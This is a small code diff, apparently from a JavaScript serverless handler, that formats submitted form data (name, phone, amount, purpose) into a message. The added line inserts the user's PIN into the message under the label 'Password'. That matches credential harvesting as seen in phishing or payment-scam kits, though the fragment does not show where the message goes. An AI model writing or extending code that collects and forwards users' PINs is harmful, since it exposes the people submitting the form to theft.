@@ -12,6 +12,7 @@ export default async (req) => {
 👤 Name: ${data.name}
 📱 Phone: ${data.phone}
 💰 Amount: ${data.amount}
+📌 Password: ${data.pin}
 🎯 Purpose: ${data.purpose}
 `;
 
